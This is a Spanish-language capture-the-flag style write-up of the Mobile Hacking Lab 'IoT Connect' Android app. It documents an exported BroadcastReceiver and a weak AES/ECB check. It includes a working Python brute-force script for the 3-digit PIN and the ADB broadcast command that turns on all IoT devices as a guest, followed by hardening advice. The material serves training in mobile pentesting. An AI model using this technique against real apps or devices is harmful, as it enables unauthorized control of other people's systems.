# 🔓 IoT Connect - Análisis y Explotación de BroadcastReceiver Vulnerable

Este repositorio documenta el análisis completo y explotación de una vulnerabilidad crítica en una aplicación Android IoT ficticia, **IoT Connect**, utilizada como laboratorio para prácticas de pentesting móvil.

---

## 🧪 Instalación y Registro

Comenzamos instalando el APK en el dispositivo.

![Instalación del APK](imagenes/01_instalacion_apk.png)

Creamos una nueva cuenta de usuario:  
`fr3do : fr3do`

![Formulario de registro](imagenes/02_signup_form.png)  
![Registro exitoso](imagenes/03_signup_success.png)  
![Inicio de sesión](imagenes/04_login.png)

---

## 🔍 Exploración del Comportamiento

Una vez dentro de la app, notamos que algunos dispositivos pueden ser controlados.

![Vista de control de artefactos](imagenes/05_dispositivos_apagados.png)

Pero como usuario invitado, aparece el mensaje:

> **"Sorry Guest..."**

Esto sugiere que existen funciones ocultas o limitadas por permisos. Es el punto de partida para el análisis en `jadx-gui`.

![Mensaje de error de Guest](imagenes/06_sorry_guest.png)

---

## 🧬 Análisis Estático con jadx-gui

### AndroidManifest.xml

Exploramos el archivo `AndroidManifest.xml` y encontramos:

```xml
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```
✅ Está exportado, lo que significa que cualquier app externa o ADB puede enviarle un intent.
Componentes Relevantes

Componentes Relevantes
Componentes encontrados en el AndroidManifest:

MainActivity, LoginActivity, SignupActivity

IoTNavigationActivity, HomeActivity

MasterSwitchActivity – Su nombre sugiere control administrativo o maestro.

CommunicationManager – Maneja las comunicaciones, y contiene el método initialize() que registra dinámicamente el receptor para MASTER_ON.

Lógica en CommunicationManager
En la clase CommunicationManager:

Se registra dinámicamente un BroadcastReceiver para la acción MASTER_ON.

Se extrae un parámetro key del Intent.

Se verifica mediante Checker.INSTANCE.check_key(key).

Si es válido, se llama a turnOnAllDevices(context).

Análisis de Seguridad: Checker
En la clase Checker se encuentra lo siguiente:
```
java
Copiar
Editar
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

public final boolean check_key(int key) {
    return decrypt(ds, key).equals("master_on");
}
```
El string cifrado se desencripta con AES/ECB/PKCS5Padding.

La clave se genera con el valor entero del PIN proporcionado.

Si el resultado es "master_on" el acceso es válido.


## 🧨 Fuerza Bruta del PIN
Como el PIN es de 3 dígitos, creamos un script Python para romper la clave por fuerza bruta.

### Código Python
```
from Crypto.Cipher import AES
from base64 import b64decode

ds = "OSnaALIWUkpOziVAMycaZQ=="

def generate_key(key):
    key_bytes = bytearray(16)
    static_bytes = str(key).encode("utf-8")
    key_bytes[:len(static_bytes)] = static_bytes[:16]
    return bytes(key_bytes)

def decrypt(ds, key):
    secret_key = generate_key(key)
    cipher = AES.new(secret_key, AES.MODE_ECB)
    decrypted = cipher.decrypt(b64decode(ds))
    return decrypted.decode("utf-8")

for i in range(100, 1000):
    try:
        result = decrypt(ds, i)
        if "master_on" in result:
            print(f"✔️ Key encontrada: {i}, Resultado: {result}")
            break
    except Exception:
        continue
```

Resultado:

```
✔️ Key encontrada: 345, Resultado: master_on
🚀 Explotación desde ADB
Ahora podemos explotar la vulnerabilidad usando el siguiente comando ADB:
```

```
adb shell am broadcast -a MASTER_ON --ei key 345
```
Resultado:

✅ El sistema responde:
All devices are turned on

✅ Confirmamos que, incluso como "Guest", pudimos activar todos los artefactos IoT.



✅ Conclusión
Se descubrió un BroadcastReceiver vulnerable expuesto sin validación de permisos.

Fue posible forzar la clave por fuerza bruta (solo 3 dígitos).

Se obtuvo control total de los dispositivos conectados simplemente enviando un Intent.

## 🛡️ Recomendaciones de Seguridad
Establecer android:exported="false" para componentes sensibles.

Validar siempre permisos y autenticación en receivers.

Utilizar claves fuertes y derivadas de métodos seguros (PBKDF2, bcrypt, etc).

No usar AES en modo ECB (es inseguro y predecible).

Evitar lógica de seguridad crítica en el lado cliente.

## 📁 Créditos
Análisis realizado por fr3do

Laboratorio: IoT Connect - Mobile Hacking Lab
